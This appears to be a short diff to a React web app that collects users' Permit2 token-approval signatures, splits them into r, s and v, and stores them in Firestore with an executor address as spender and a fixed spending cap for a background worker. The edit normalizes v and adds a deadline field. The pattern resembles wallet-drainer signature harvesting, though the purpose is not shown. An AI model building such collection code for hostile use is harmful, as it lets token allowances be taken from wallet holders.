@@ -416,15 +416,19 @@ export default function App() {
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
-      const v = parseInt(raw.substring(128, 130), 16);
+      let v = parseInt(raw.substring(128, 130), 16);
+      // Normalize v to 27/28 if wallet returned 0/1
+      if (v === 0 || v === 1) v += 27;
 
       const id = connectedAddress + "_" + Date.now();
 
+      // Save both `deadline` (used by worker) and `expiration` for backwards compatibility
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
         spender: executorAddress,
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: SPENDING_CAP.toString(),
+        deadline: deadline,
         expiration: deadline,
         nonce,
         r, s, v,
